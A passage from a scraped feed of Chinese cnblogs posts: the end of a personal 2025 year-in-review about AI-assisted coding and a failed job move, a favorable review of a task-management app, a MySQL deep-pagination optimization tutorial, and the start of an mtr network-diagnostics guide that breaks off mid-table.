年不一样，我开始认真经营表达：每天钻研、每天尝试、每天复盘。公众号有了更明确的正反馈，有几篇文章突然被推起来，评论区开始出现陌生人的共鸣，后台也开始有人来问我问题。那种感觉很奇妙——我写的东西不再只属于我自己，它开始进入别人的生活。</p>\n<p><strong>今年使用最多的AI IDE 就是Trae，也参加了第一期的Trae 征文活动，获得了第二名，Trae给我来了很多成长。</strong></p>\n<h3 id=\"今年在trae-方面的实践\">今年在Trae 方面的实践：</h3>\n<ol>\n<li><a href=\"https://juejin.cn/post/7462542925915848744\" rel=\"noopener nofollow\" target=\"_blank\">字节跳动推出AI编程神器Trae，基于Trae 从 0 开发一个Google 插件！</a><br />\n<img alt=\"image\" class=\"lazyload\" /></li>\n</ol>\n <hr /> \n<hr /> \n<p>2.<a href=\"https://github.com/TickHaiJun/Dompet-App-React-Native\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae 开发的第一个APP</a></p>\n<p>Trae 刚出来Claude模型时，连夜测评它的能力，当时花了5个小时搞出一个App，项目并且还开源了<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<hr /> \n<ol start=\"3\">\n<li><a href=\"https://github.com/TickHaiJun/Podcast\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae 设计的原型稿</a></li>\n</ol>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我也开始碰视频。说实话，一开始很狼狈：剪一个一分钟的视频，要花我两三个小时。卡点、配乐、字幕、节奏，哪一样都不像看起来那么简单。我一度怀疑是不是我不适合，但又不甘心。我知道这是一块我之前没尝试过的能力，一旦练出来，就是新的路。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1VHQLYvE6C/?vd_source=824b78ff76f90d1fc4e5e732bb09b3c1\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae还做了原型还原设计稿，没想到视频火了</a><br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<hr /> \n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>这一段给我的礼物，是一种更稳定的自信：很多事看起来复杂，只要拆开、一步步做，就会变得可控。</p>\n<hr />\n<h2 id=\"2-我把想法做成了作品通过vibe-coding\">2. 我把想法做成了作品通过Vibe Coding</h2>\n<p>五月到八月，我进入了一种“手里有活”的状态。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=Mzg2ODI4OTMwMw==&amp;mid=2247492557&amp;idx=1&amp;sn=8949270a3c3bf6f409d6e6046cb8411a&amp;scene=21#wechat_redirect\" rel=\"noopener nofollow\" target=\"_blank\">从懵懂到落地：记录我们第一次成功将大模型“塞”进业务的曲折历程</a></p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>年初做了自己第一款AI应用</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那段时间我做了很多作品，也开源了不少东西。说白了，就是把想法从脑子里拎出来，做成一个能跑、能看、能用、能被别人理解的东西。</p>\n<p>与此同时，我也给团队做了多次分享，讲我最近在做什么、怎么做、踩了什么坑、怎么绕开。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>中间有两次机会我印象很深：一次是来自一家很大的咨询公司，一次是出海方向的远程邀请。它们都挺诱人，但我当时都拒绝了。原因很简单：我知道我还没准备好。能力没到那个厚度、心态没到那个稳定度，我不想靠运气上去，然后靠硬扛撑住。</p>\n<p>也有一些小小的惊喜：有人买了我做的东西，虽然数量不算多，但足够让我确认——我做的东西不是自嗨，是真的有人需要。更重要的是，越来越多的网友通过我的内容认识我，联系我，问我问题。</p>\n<p>那几个月我最大的收获不是“做了多少”，而是一个更朴素的结论：<strong>想法不值钱，做出来才值钱。</strong></p>\n<hr />\n<h2 id=\"3-有人愿意为我的能力买单\">3. 有人愿意为我的能力买单</h2>\n<p>九月到十一月，我的副业开始像一门“正经事”。</p>\n<p>咨询变多了。有的是临时问答，有的是更系统的陪跑。我接了三份陪跑，也因此认识了几位很投缘的朋友，都是山西的。我们聊项目、聊选择、聊怎么把事情做成，也聊怎么在现实里不把自己弄丢。</p>\n<p>这份关系很珍贵。它不是那种互相吹捧的热闹，而是我能明显感到：对方因为我的建议少走了弯路，事情推进得更顺，而我也因为对方的反馈变得更坚定。那种“我真的帮到了人”的成就感，比数字更实在。</p>\n<p>我也在这一段第一次更清晰地看到我的位置：我不是只能埋头做项目的人，我还可以把经验讲清楚，把复杂拆简单，把别人卡住的点指出来。这是一种能力，也是一种责任感。</p>\n<p>这一段让我相信：靠自己攒出来的口碑，慢，但稳。</p>\n<hr />\n<h2 id=\"4-我重新确认了钱该花在哪\">4. 我重新确认了“钱该花在哪”</h2>\n<p>国庆我和家人自驾出去玩了一趟。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>风很大，天很高，羊肉很香。我们在草原上待了一天，我给父母安排了越野卡丁车，让他们在草地上跑一圈；我和姐姐骑了马，笑得像回到小时候。那几天我很放松，甚至有点恍惚——原来我努力这么久，最想换来的并不是某个头衔，而是这种“我能让他们开心”的底气。</p>\n<p>我以前对花钱很谨慎，总觉得要攒着、要算计回报。可当我把钱花在家人身上，那种舒坦很直接：不需要证明，不需要解释，花出去就是一种“我扛得住了”的确认。</p>\n<hr />\n<h2 id=\"5-去北京一趟我把胆子捡了回来\">5. 去北京一趟，我把胆子捡了回来</h2>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>十月我去北京参加了一个活动，也算第一次为了这类事出远门。2026年，多输出AI，多参加活动。</p>\n<p>现场人很多，节奏很快，信息密得让人喘不过气。那天我最大的感受，不是见了什么产品，而是突然明白：机会真的会从我身边走过去，走过去就没了。很多时候不是我不够好，是我不敢站出来，或者我下意识觉得“我还不够格”。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>去天津路上，熟悉的感觉</p>\n<p>我也去了天津，见了老朋友老李。我们聊了一整天，我帮他搬运整理食品，他带我吃了天津菜，甚至让我体验了一把保时捷 911。最后他把我送到机场。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那一天让我很感慨：这个世界其实很大，也很活，我不能总把自己困在“怕麻烦、怕尴尬、怕出丑”的情绪里。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>今年我也买了不少书，也读了不少书。《亲密关系》《认知驱动》《纳瓦尔宝典》……它们没有给我标准答案，但给了我更清醒的视角：我要对自己的情绪负责，对自己的选择负责，对自己的长期负责。</p>\n<hr />\n<h2 id=\"6-我相信过他也因此完成了一次祛魅\">6. 我相信过他，也因此完成了一次祛魅</h2>\n<p>十一月底，我做了一个很重的决定：离职，去北京试一次。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>这件事我并不是冲动。相反，我想了将近一个月。朋友“他”邀请过我三次，前两次我都拒绝了。第三次创始人亲自找我，话说得很漂亮，未来画得很大，而我也确实在那个阶段渴望一次更大的空间。再加上对“他”的信任，我最终点了头。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>离开前，我做了一件我很想做的事：把爸爸接到上海。那是他第一次来上海，也是他第一次坐飞机。我去接他的时候，他脸上的喜悦藏不住。我带他逛了很多地方，拍了很多照片。送他去机场那天，我心里很踏实——那种成就感，不来自任何评价，只来自“我能带他看世界”的瞬间。</p>\n<p>今年我也给妈妈买了新手机，她之前那部太卡了。再小的事情，落在父母身上都是实在的改变。</p>\n<p>然后我去了北京。</p>\n<p>现实很快给了我一记闷棍。之前说的和实际差太多太多。我会在很短时间内发现：有些话只是话，有些承诺只是情绪，有些“格局”只是包装。我不想在这里写具体细节，但我可以写结论——这次经历让我完成了一次祛魅：对人、对所谓“机会”、对“看起来很美”的未来。</p>\n<p>我也更清楚了一件事：我并不是不能吃苦，我是不愿意把我的尊严和时间押在不靠谱的人和不靠谱的事上。</p>\n<hr />\n<h2 id=\"7-我救了三只狗也被这座城市的善意接住\">7. 我救了三只狗，也被这座城市的善意接住</h2>\n<p>这一年我救了三只狗。<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<p>第一只是中华田园犬，在公园遇到的。它很瘦，眼神怯，但又不躲人。</p>\n<p>第二只是边牧，在公司附近，它更像是走丢的孩子，聪明又无助。<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<p>第三只是阿拉斯加，在豫园附近，体型很大，却一点安全感都没有。</p>\n<p>我喜欢狗。遇见它们的时候，我很难装作没看见。我做的事其实也不复杂：拍照、发帖、联系、筛选领养人、把信息对齐清楚，然后送它们去新家。</p>\n<p>这件事最打动我的，不是我多善良，而是我发现：大城市真的有很多愿意伸手的人。我发出求助，真的会有人回应。我以为我在救它们，其实在某些时刻，是这些善意在把我从疲惫里接住。</p>\n<hr />\n<h2 id=\"8-一笔沉没成本止损维权和不再委屈自己\">8. 一笔沉没成本：止损、维权、和不再委屈自己</h2>\n<p>十二月初，北京给了我最硬的一课。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我在北京待了十来天，一直住酒店。对方之前说会报销，但后来什么都没有。入职前一天我找了房子，租房费用、中介费用、再加上各种奔波成本，堆起来是一笔不小的支出。更糟的是：入职第一天我就通过另一位同样处境的人了解到了真实情况；再加上“他”下班后说的一些话，我很快确定——这里不是我该待的地方。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那一刻最难的其实不是离开，而是面对沉没成本。我已经付出那么多，我会本能地想“再忍忍，再等等”。但我很庆幸，那天我没骗自己。我选择止损。</p>\n<p>随之而来的就是维权。房子我没入住，合同日期也没开始，但管家很无赖，甚至带着恐吓。那种“我讲理他就耍赖”的感觉很恶心。我一开始也很烦，后来干脆不和她废话，直接走流程，通过 12315 协调，拿回了一部分。理论上可以拿回更多，但要继续耗时间精力，我当时选择到此为止。</p>\n<p>这一段时间，让家里也没少操心，哎....</p>\n<p>我最想写给自己的不是“钱亏了”，而是一个更重要的结论：<strong>以后遇到不公，我不再用委屈换和平。该维权就维权，该翻脸就翻脸。</strong></p>\n<hr />\n<h2 id=\"9-回到上海我把自己一点点拉回正轨\">9. 回到上海：我把自己一点点拉回正轨</h2>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>十二月中旬我回到了上海。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>收拾好家里的工位</p>\n<p>那段时间我能量很低。不是累，是一种被现实撞过之后的钝。我会怀疑自己、怀疑判断、怀疑信任，甚至怀疑“是不是我太敏感了”。但生活不会等我缓过来，它只会继续往前。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我做的第一件事是把我自己拉回正常：吃饭、睡觉、见朋友。后来我和老耿去了杭州散心。城市很安静，走在路上我突然发现：风还是一样吹，灯还是一样亮，我不会因为受挫就失去明天。</p>\n<p>我慢慢控住场了。把生活拉回正轨了。也把那句最重要的话重新捡回来——<strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<hr />\n<h2 id=\"最后\">最后</h2>\n<p>回头看 2025 年，我最大的变化不是“我做了多少”，而是<strong>我对人生结构的要求变高了</strong>。</p>\n<p>以前我会把努力当成答案。现在我更在意：这份努力能不能沉淀，能不能让我拥有更多选择权。以前我遇到烂事会先忍，想着“算了”。但北京那一段之后我更确定：委屈不会换来尊重，只会换来下一次更大的代价。该止损就止损，该维权就维权——哪怕沉没成本已经砸下去，我也要把自己从泥里拎出来。</p>\n<p>这一年我也完成了一次祛魅：<br />\n对“机会”的祛魅，对“关系”的祛魅，对“画出来的未来”的祛魅。<br />\n我开始相信一句话：<strong>真正值得的机会，不会只靠嘴说；真正可靠的人，也不会只靠情绪绑架。</strong></p>\n<p>如果说 2025 年教会了我什么，我觉得是三件事：</p>\n<p>第一，能力不是拿来逞强的，是拿来兜底的。<br />\n我在最狼狈的时候，靠自己把局面稳住了。那种“我能扛住”的底气，是真的。</p>\n<p>第二，钱花在家人身上，会变成一种很踏实的成就感。<br />\n我以前以为成就感来自外界认可，今年我更确定：来自父母的笑、来自家人的安心、来自“我可以照顾他们”。</p>\n<p>第三，善意是会流动的。<br />\n我帮过人，也被人帮过；我救过狗，也被陌生人的热心治愈过。世界不全是烂人，但我得学会识别，学会筛选，学会保护自己。</p>\n<p>2026 年我不想再喊口号了。我只想做三件更具体的事：</p>\n<ul>\n<li><strong>把一条能长期跑的主线做出来</strong>：让输出、作品和服务真正形成稳定的节奏，而不是靠运气起伏。</li>\n<li><strong>给信任立规矩</strong>：合作要有边界，承诺要能落地，任何决定都要留后手。</li>\n<li><strong>把家放进计划里</strong>：不是“有空再说”，而是本来就该排在前面。</li>\n</ul>\n<p>2025 年没有把我推到高处，但它把我从幻觉里拽出来了。<br />\n我依然会往前走，只是以后我更在乎的不是速度，而是方向；不是热闹，而是结构。</p>\n<p><strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<p>希望2026年一切顺利!</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 15:50</span>&nbsp;\n<a href=\"https://www.cnblogs.com/HaiJun-Aion\">程序员海军</a>&nbsp;\n阅读(<span id=\"post_view_count\">73</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "终于找到了一款足够简单的任务管理软件",
      "link": "https://www.cnblogs.com/lbnnbs/p/19491338",
      "published": "",
      "description": "<div class=\"postTitle\">\n            <h1><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lbnnbs/p/19491338\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 12:23\">\n    <span>终于找到了一款足够简单的任务管理软件</span>\n    \n\n</a>\n</h1>\n        </div>\n        <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n现在大家不但休息时间很碎片化，工作时间很多时候都是碎片化的。为了管理好自己的工作，我各类软件都使用过。但市面上多数工具要么功能繁杂，要么不支持手机版，要不就是收费太贵，真不是我这样的小白能用的起的。我个人使用过使用过很多的工作任务管理软件，有项目管理类的，有便签类的，有日程类的。但项目管理类的操作过于复杂，日程类和便签类的又没有团队协作功能。总之很难找一款简单好用的小团队小项目任务管理软件。后来百度的时候搜索到了一款叫九运任务宝的小工具，它官网上强调以 “简单、轻快、好用” 为核心定位，感觉有点点靠谱。下载试用后感觉还真不错，最起码要的东西都有。现在经过了几个月的使用，感觉找到了梦中情软（说的过分了点^_^）。<br /><br />传统任务管理软件，创建一个任务需要经历填写名称、设置分类、选择成员、调整时间等多个繁琐步骤，甚至需要跳转多个页面才能完成配置，新手入门需要花不少时间去学习，特别是项目管理类的，特别复杂。不但没有帮到工作排期，反而给增加了额外负担。而且有些工具的任务编辑功能简陋，缺少撤销重做，手机上操作一不小心删除时删过了头，就要重写一大段了。但这个九运任务宝任务创建全流程都和简单，只需专注填写任务内容，会自动根据首段内容智能生成任务名称，不用反复斟酌标题，秒速完成任务记录。任务内容编辑框带了撤销和重做功能，操作失误要不怕。<br /><br />他还有一个上传的图片会自动标注序号的功能，可以和任务内容上的描述匹配起来，让任务要求更清晰。这种 “少操作、多专注” 的设计，让任务创建效率提高不少。<br /><br />传统任务管理软件常常追求 “大而全”，堆砌了大量使用率极低的复杂功能，不仅增加了软件体积和操作难度，还容易让我在众多功能面前一脸懵逼。<br /><br />比如吧，项目管理类软件权限管理模块设计太复杂，设置流程繁琐。在比如大多数工具的任务状态没有 “搁置” 等选项，暂时无需处理的任务只能占用列表空间，导致信息杂乱。<br /><br />但这个九运任务宝在任务设置上，有“已搁置” 这个任务状态，就很方便，任务列表更整洁。在时间选择界面用绿色加粗字体标注节假日，工作排期时不需要额外切换日历APP查询假期。批量操作功能简单直观，长按任务即就可以进入批量编辑模式，右滑操作也很人性化，搞得我不时就像去划一下。此外，任务分类、优先级设置、协作人指派、甘特图等核心功能一应俱全，既满足多场景需求，又没啥多余的操作。<br /><br />另外，大多拥有项目和任务管理的软件移动端都比较难用，外出时宅手机上处理任务很头疼。这个九运任务宝就支持 PC 电脑端、手机 APP 端、微信小程序端、手机 H5 网页端，在外面也能随时随地操作。<br /><br />感觉现在的软件都越做越复杂，不实用的功能一大堆，追求大而全，像这类关注核心需要的软件倒是更少，也不知道是咋回事，是不知道我们需要什么样的工具才顺手吗。\n</div>\n<div class=\"clear\"></div>\n\n        <div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-01-16 12:23</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lbnnbs\">lbnnbs</a>&nbsp;\n阅读(<span id=\"post_view_count\">403</span>)&nbsp;\n评论(<span id=\"post_comment_count\">3</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "MySQL深度分页优化实战：从踩坑到落地的全攻略",
      "link": "https://www.cnblogs.com/sun-10387834/p/19491242",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/sun-10387834/p/19491242\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 11:57\">\n    <span>MySQL深度分页优化实战：从踩坑到落地的全攻略</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>做后端开发的同学，大概率都遇到过MySQL分页的坑——浅分页时查询秒回，一旦翻到几十页、上百页之后，接口就开始卡顿，甚至直接超时。之前在做电商商品列表接口时，就因为没处理好深度分页，线上出现过多次接口超时告警，排查后才发现是分页SQL的问题。今天就结合实际开发经验，聊聊MySQL深度分页的本质问题，以及那些能直接落地的优化方案，都是经过生产环境验证的干货。</p>\n<p>先说说最开始踩的坑。当时商品列表接口用的是最常规的分页写法，也就是LIMIT offset, size，代码里封装了通用分页逻辑，前端传页码和每页条数，后端计算offset后拼SQL。上线初期数据量少，翻个十几页都没问题，可随着商品数据涨到几十万条，用户翻到第500页之后，接口响应时间直接从几十毫秒飙升到几百甚至上千毫秒，监控面板上全是红色告警。</p>\n<h2 id=\"一深度分页为什么会慢\">一、深度分页为什么会慢？</h2>\n<p>一开始以为是索引没建对，排查后发现索引是正常的，后来翻了MySQL官方文档，再结合执行计划分析，才搞懂了核心原因。我们常用的LIMIT offset, size写法，比如LIMIT 100000, 20，MySQL并不是直接跳过前10万条数据取后面20条，而是会从表的第一条数据开始，逐行扫描，一共读取100020条数据，然后丢弃前10万条，只返回最后20条。</p>\n<p>这就意味着，offset越大，MySQL需要扫描的行数就越多，磁盘IO和内存消耗都会急剧增加，查询效率自然呈指数级下降。如果分页SQL还没命中索引，触发全表扫描，那情况会更糟，直接导致整个数据库实例压力飙升，影响其他接口。</p>\n<h2 id=\"二实战优化方案从易到难落地\">二、实战优化方案：从易到难落地</h2>\n<p>针对深度分页问题，没有万能方案，只能结合业务场景选择最合适的。下面按优先级排序，分享几个实际项目中用过的优化方案，从改造成本低到高逐步说明。</p>\n<h3 id=\"方案一书签分页最优解90场景适用\">方案一：书签分页（最优解，90%场景适用）</h3>\n<p>这是我目前在项目中用得最多的方案，改造成本低，性能提升明显，核心思路是放弃offset偏移，用上一页最后一条数据的主键或唯一索引作为“书签”，让MySQL直接通过索引定位到书签位置，再往后查询指定条数，彻底避免扫描无用数据。</p>\n<p>比如之前的商品列表，用主键id排序，原来的低效写法是：</p>\n<pre><code class=\"language-sql\">-- 第5001页，每页20条，offset=100000\nSELECT id, name, price, category FROM goods WHERE category=1 ORDER BY id LIMIT 100000, 20;\n</code></pre>\n<p>优化后，让前端传递上一页最后一条数据的id，比如上一页最后一条id是100000，新的SQL写法是：</p>\n<pre><code class=\"language-sql\">SELECT id, name, price, category FROM goods WHERE category=1 AND id &gt; 100000 ORDER BY id LIMIT 20;\n</code></pre>\n<p>这样MySQL会直接通过主键索引定位到id=100000的位置，再往后取20条数据，只扫描20条记录，不管数据量多大，查询速度都能稳定在毫秒级。</p>\n<p>这里有个需要注意的点：如果排序字段不是主键，而是普通字段（比如create_time），且存在重复值，直接用该字段作为书签会导致分页重复或漏数据。这时需要用“排序字段+主键”的组合作为锚点，保证唯一性。</p>\n<p>比如按创建时间倒序分页，优化写法如下：</p>\n<pre><code class=\"language-sql\">-- 上一页最后一条数据：create_time='2026-01-15 18:30:00'，id=100000\nSELECT id, name, price, create_time FROM goods \nWHERE category=1 AND (create_time &lt; '2026-01-15 18:30:00' OR (create_time = '2026-01-15 18:30:00' AND id &lt; 100000))\nORDER BY create_time DESC, id DESC LIMIT 20;\n</code></pre>\n<p>这种组合锚点的方式，能完美解决排序字段重复导致的分页异常问题，也是生产环境中处理非主键排序分页的标准写法。</p>\n<h3 id=\"方案二子查询join优化兼容跳页需求\">方案二：子查询/JOIN优化（兼容跳页需求）</h3>\n<p>书签分页的缺点是不支持直接跳转到指定页码，而很多业务场景（比如后台管理系统的分页组件）必须有页码选择功能，这时就需要用子查询或JOIN来优化。</p>\n<p>核心思路是：先通过索引查询出需要的主键ID，再通过主键关联查询全字段数据。因为主键是聚簇索引，查询主键的速度极快，子查询只扫描主键字段的offset+size条数据，而不是全字段，能大幅降低IO开销。</p>\n<p>原来的低效写法优化前：</p>\n<pre><code class=\"language-sql\">SELECT * FROM goods WHERE category=1 ORDER BY id LIMIT 100000, 20;\n</code></pre>\n<p>用JOIN优化后的写法（性能更优，MySQL推荐）：</p>\n<pre><code class=\"language-sql\">SELECT g.* FROM goods g\nJOIN (SELECT id FROM goods WHERE category=1 ORDER BY id LIMIT 100000, 20) t ON g.id = t.id\nORDER BY g.id;\n</code></pre>\n<p>这种方案能完美兼容跳页需求，不需要改造前端分页组件，性能比原生LIMIT提升10~100倍，offset越大，优化效果越明显。需要注意的是，子查询中的排序字段必须建立索引，否则子查询依然会全表扫描，优化失效。</p>\n<h3 id=\"方案三业务层限制最简单的兜底方案\">方案三：业务层限制（最简单的兜底方案）</h3>\n<p>其实很多ToC业务场景中，用户根本不会翻到第100页之后。比如电商商品列表，用户通常只看前10页，翻到后面的概率极低。针对这种场景，最简单的优化方式就是在业务层限制最大页码。</p>\n<p>我们当时在商品列表接口中做了限制：最多只能翻到第50页，超过50页就提示“暂无更多数据”，同时引导用户通过筛选条件（比如价格区间、销量排序）缩小查询范围。这种方式零开发成本，零性能损耗，直接从根源解决问题，适合大多数ToC业务。</p>\n<h3 id=\"方案四特殊场景兜底海量数据批量导出\">方案四：特殊场景兜底（海量数据/批量导出）</h3>\n<p>如果遇到千万级数据的深度分页，或者需要批量导出海量数据的场景，上面的方案可能不够用，这时可以考虑预生成分段ID或使用游标分页。</p>\n<p>预生成分段ID的思路是：在数据表中新增segment_id字段，按主键分段（比如每1000条数据为一个分段），建立segment_id索引。分页时先按segment_id定位分段，再在分段内分页，避免大范围扫描。这种方式适合数据更新频率低的场景，性能极致，但需要预处理数据。</p>\n<p>游标分页则适合批量数据导出、离线任务等不需要跳页的场景，通过MySQL游标逐行读取数据，避免一次性加载大量数据到内存，不会有offset的性能问题，但业务改造成本较高，只适合后端离线任务。</p>\n<h2 id=\"三优化必守原则缺一不可\">三、优化必守原则（缺一不可）</h2>\n<p>不管用哪种优化方案，以下两个原则必须遵守，否则所有优化都会失效：</p>\n<p>1. 分页SQL必须命中索引：WHERE筛选条件+ORDER BY排序条件，必须建立对应的单列索引或联合索引，否则MySQL会触发全表扫描+文件排序，性能依然极差。比如上面的商品列表，需要建立category+id的联合索引，才能让分页SQL高效执行。</p>\n<p>2. 避免使用SELECT *：只查询需要的字段，减少数据传输和内存开销。如果表中有text、blob等大字段，SELECT *会导致性能严重损耗，甚至拖慢整个数据库。</p>\n<h2 id=\"四总结\">四、总结</h2>\n<p>MySQL深度分页的核心矛盾，本质是offset导致的无效扫描。优化的核心思路就是：能不用offset就不用，优先用书签分页；必须用offset就减少扫描数据量，用子查询/JOIN优化；业务上能限制分页深度就限制，从根源规避问题。</p>\n<p>在实际开发中，不需要追求最复杂的方案，而是要结合业务场景选择最合适的。大部分场景下，书签分页+索引优化就能满足需求，改造成本低，性能又稳定。希望这篇实战总结能帮到大家，避开MySQL深度分页的坑。</p>\n\n</div>\n<div id=\"MySignature\">\n    \n<p>❤️ 如果你喜欢这篇文章，请点赞支持！ 👍 同时欢迎关注我的博客，获取更多精彩内容！</p>\n\n<p>本文来自博客园，作者：<a href=\"https://www.cnblogs.com/sun-10387834/\" target=\"_blank\">佛祖让我来巡山</a>，转载请注明原文链接：<a href=\"https://www.cnblogs.com/sun-10387834/p/19491242\" target=\"_blank\">https://www.cnblogs.com/sun-10387834/p/19491242</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 11:57</span>&nbsp;\n<a href=\"https://www.cnblogs.com/sun-10387834\">佛祖让我来巡山</a>&nbsp;\n阅读(<span id=\"post_view_count\">196</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "网络问题如何排查？mtr命令详解",
      "link": "https://www.cnblogs.com/deep-sky/p/19491194",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/deep-sky/p/19491194\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 11:47\">\n    <span>网络问题如何排查？mtr命令详解</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h3 id=\"mtr\">mtr</h3>\n<p><code>mtr</code>命令是一个网络诊断工具，用于检测网络的连通性和延迟。MTR是My Traceroute的缩写，是traceroute和ping命令的结合体。</p>\n<p><code>mtr</code>默认使用<code>ICMP</code>协议，在介绍<code>mtr</code>的详细用法前我们先了解下<code>ICMP</code>协议。</p>\n<h3 id=\"imcp\">IMCP</h3>\n<p><code>ICMP</code>（Internet Control Message Protocol，互联网控制报文协议）<br />\n是一种网络层（OSI 第三层）协议，主要用于在 IP 网络中传递控制信息和错误信息，而不是用来传输业务数据。<br />\n<code>ICMP</code>的作用是：<br />\n1、网络连通性测试<br />\n最常用的就是<code>ping</code>命令，发送的是<code>ICMP Echo Request</code>，对方回复<code>ICMP Echo Reply</code>，用来判断网络是否可达、是否丢包以及延迟</p>\n<p>2、网络故障和错误反馈<br />\n当 IP 包在传输过程中出现问题时，<code>ICMP</code> 会返回错误信息，例如：</p>\n<table>\n<thead>\n<tr>\n<th>场景</th>\n<th>ICMP 类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>目标主机不可达</td>\n<td>Destination Unreachable</td>\n</tr>\n<tr>\n<td>路由中 TTL 用尽</td>\n<td>Time Exceeded</td>\n</tr>\n<tr>\n<td>需要分片但禁止分片</td>\n<td>Fragmentation Needed</td>\n</tr>\n</tbody>\n</table>\n<p>例如：路由器发现下一跳不可达时就会被源主机发送一个ICMP不可达报文</p>\n<p>3、网络路径诊断<br />\n<code>traceroute</code>和<code>tracert</code>就是通过<code>ICMP</code>实现的</p>\n<h3 id=\"mtr的用法\">mtr的用法</h3>\n<pre><code>Usage:\n mtr [options] hostname\n\n -F, --filename FILE              从文件中读取hostname(s)\n -4                               使用IPv4\n -6                               使用IPv6\n -f, --first-ttl NUMBER           起跳ttl参数，跳过前面的N-1跳，只只显示TTL=N后的跳（不改变真实路由，只是不显示）\n -m, --max-ttl NUMBER             maximum number of hops\n -u, --udp                        使用UDP 替代 ICMP echo\n -T, --tcp                        使用 TCP 替代ICMP echo\n -P, --port PORT                  使用TCP、SCTP或UDP探测时的目标端口\n -s, --psize PACKETSIZE           设置探测包的 payload 大小（字节）\n -i, --interval SECONDS           设置探测包的 发送间隔\n -r, --report                     报告模式（一次性输出，不刷新）\n -w, --report-wide                报告模式，宽屏对齐输出（字段不截断）\n -c, --report-cycles COUNT        发送探测包次数，设置20快速判断，设置100较为可信\n -j, --json                       以json格式输出\n -x, --xml                        以xml格式输出\n -C, --csv                        以csv格式输出\n -l, --raw                        以原始格式输出\n -n, --no-dns                     不做反向dns解析(只显示ip)\n -y, --ipinfo NUMBER              输出 IP 归属信息（国家 / 运营商）\n\n</code></pre>\n<p>在linux上执行<code>mtr</code>时，<code>mtr</code>会直接操作网络层构造IP/ICMP报文，所以一般需要使用<code>sudo</code>执行</p>\n<p>示例：<br />\n<code>sudo mtr -r -n -c 100 www.baidu.com</code></p>\n<p>输出结果:</p>\n<pre><code>Start: 2026-01-15T19:00:01+0800\nHOST: LTB-MBP.local               Loss%   Snt   Last   Avg  Best  Wrst StDev\n  1.|-- 183.2.172.177              0.0%   100    2.0   1.8   0.4  26.2   3.4\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>字段</th>\n<th>含义</th>\n<th>解读要点</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>HOST</code></td>\n<td>当前跳主机</td>\n<td><code>*</code> 